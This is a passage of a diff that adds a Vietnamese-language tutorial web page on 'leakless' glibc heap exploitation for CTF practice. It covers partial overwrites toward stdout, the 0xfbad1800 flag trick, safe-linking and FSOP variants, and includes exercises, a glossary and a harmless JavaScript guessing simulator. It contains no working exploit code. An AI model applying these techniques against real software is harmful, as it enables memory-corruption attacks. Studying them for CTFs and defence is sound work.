+    <div class="card"><div class="term">p16/u64</div><h4>Partial OW</h4><p>Ghi/đọc 2 byte.</p></div>
+    <div class="card"><div class="term">while True</div><h4>Brute 1/16</h4><p>Lặp tới khi trúng nibble.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi leakless không ra</h2>
+  <div class="grid">
+    <div class="card"><h4>Không trúng stdout</h4><p>2 byte thấp sai. gdb: p &amp;_IO_2_1_stdout_ byte thấp.</p></div>
+    <div class="card"><h4>In ra rác</h4><p>write_base trỏ sai vùng. Trỏ nơi có con trỏ libc.</p></div>
+    <div class="card"><h4>Crash khi malloc stdout</h4><p>tcache check size. Khớp size bin.</p></div>
+    <div class="card"><h4>safe-linking</h4><p>2.32+ fd mã hoá. Leak heap trước (leakless heap base).</p></div>
+    <div class="card"><h4>Brute quá lâu</h4><p>1/16 remote chậm. Tối ưu, hoặc tìm leak khác.</p></div>
+    <div class="card"><h4>Hook xoá (2.35)</h4><p>Sau leak dùng FSOP/exit handler thay __free_hook.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & CON ĐƯỜNG</div>
+  <h2>Các kiểu leakless</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Con đường</th><th>Ý tưởng</th></tr></thead>
+    <tbody>
+      <tr><td>stdout FILE dump</td><td>partial OW → stdout → ép in libc (bài này)</td></tr>
+      <tr><td>Leak heap base</td><td>safe-linking lộ heap qua fd &gt;&gt;12; partial OW heap</td></tr>
+      <tr><td>House of Apple leakless</td><td>FSOP không cần đọc leak, chỉ con trỏ sẵn</td></tr>
+      <tr><td>ret2dlresolve heap</td><td>không cần libc leak (xem <a href="ret2dlresolve.html">dlresolve</a>)</td></tr>
+      <tr><td>largebin attack</td><td>ghi con trỏ không cần đọc trước</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">glibc</span>2.31: partial OW dễ (fd thô). 2.32+: safe-linking mã hoá fd → khó partial OW tcache, nhưng unsorted fd (main_arena) KHÔNG mã hoá → vẫn leakless được qua unsorted. 2.35+: hook xoá → sau leak dùng FSOP. Luôn tra offset stdout/arena trên libc đề.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · stdout leak</div><p>Đề không show. Partial OW → stdout dump libc.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · leak heap base</div><p>safe-linking fd>>12 lộ heap, khai thác tiếp.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐⭐ · full leakless FSOP</div><p>Không leak, đi thẳng Apple 2 bằng con trỏ sẵn.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">leakless</div><p>Không cần leak địa chỉ.</p></div>
+    <div class="card"><div class="term">unsorted bin</div><p>fd=main_arena+96 (con trỏ libc).</p></div>
+    <div class="card"><div class="term">partial OW</div><p>Ghi 1-2 byte thấp.</p></div>
+    <div class="card"><div class="term">0xfbad1800</div><p>Magic flag ép stdout in.</p></div>
+    <div class="card"><div class="term">_IO_write_base</div><p>Vùng stdout bắt đầu in.</p></div>
+    <div class="card"><div class="term">safe-linking</div><p>Mã hoá fd (2.32+).</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Nền: <a href="partial_overwrite.html">partial overwrite</a> · <a href="tcache_fastbin.html">tcache</a> · <a href="unsorted_largebin.html">unsorted/largebin</a> · <a href="house_of_apple2.html">House of Apple 2</a> (leakless FSOP) · <a href="ret2dlresolve.html">ret2dlresolve</a>.</li>
+    <li>"FSOP stdout leak" (0xfbad1800) · CTF-wiki IO_FILE · safe-linking writeups.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 5 · Heap (bài cuối).</strong> Không leak được? Con trỏ libc đã nằm sẵn trong heap (unsorted fd=main_arena+96). Partial overwrite 2 byte (brute 1/16) trỏ nó tới stdout, đặt _flags=0xfbad1800 + write_base → ép glibc tự in libc ra. Có leak → khai thác bình thường. Hoặc đi thẳng FSOP không cần đọc.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("leakless-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("leakless-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  // con trỏ unsorted: 0x7f XX XX e1 be a0 ; stdout: ...e1 b7 80
+  // nibble thứ 3 (của 0xbe-area) random; đích byte thấp "80" (fixed), "b7" với nibble 'b' random?
+  // đơn giản hoá: byte thấp 80 cố định đúng, byte kế b7 có nibble cao 'b' random 1/16
+  var bytesEl=document.getElementById("poBytes"),loIn=document.getElementById("loIn"),hiIn=document.getElementById("hiIn"),msg=document.getElementById("poMsg");
+  var realNib = Math.floor(Math.random()*16); // nibble ASLR thật (ẩn), đích cần = 0xb (11)? ta set đích
+  var TARGET_NIB = 11; // 'b' của b7
+  function render(){
+    var cells=[
+      {t:"0x7f",f:false},{t:"??",f:false},{t:"??",f:false},
+      {t:"e1",f:true},{t:"?7",f:true,ow:true},{t:"80",f:true,ow:true}
+    ];
+    bytesEl.innerHTML=cells.map(function(c){
+      return '<span class="b '+(c.ow?"ow":(c.f?"fixed":""))+'">'+c.t+'</span>';
+    }).join("");
+  }
+  render();
+  document.getElementById("poBtn").addEventListener("click",function(){
+    var lo=(loIn.value||"").trim(), hi=(hiIn.value||"").trim();
+    var nib=parseInt(hi.replace("?","").replace("7","")||hi[0],16);
+    if(lo!=="80"){msg.innerHTML='<span style="color:var(--danger)">✗ byte thấp phải = 80 (byte thấp stdout cố định)</span>';return;}
+    var guess=parseInt(hi[0],16);
+    if(isNaN(guess)){msg.textContent="nhập nibble hợp lệ (vd b7)";return;}
+    if(guess===TARGET_NIB){
+      msg.innerHTML='✓ <b>Trúng!</b> con trỏ giờ = 0x7f..e1b780 = _IO_2_1_stdout_. Ghi struct → ép in leak. (ASLR 1/16 — trung bình 8 lần thử).';
+    }else{
+      msg.innerHTML='<span style="color:var(--danger)">✗ nibble '+hi[0]+' sai — con trỏ trỏ sai chỗ, crash/không in. Cần 0x<b>b</b>7 (brute 1/16). Thử lại (while True).</span>';
+    }
+  });
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
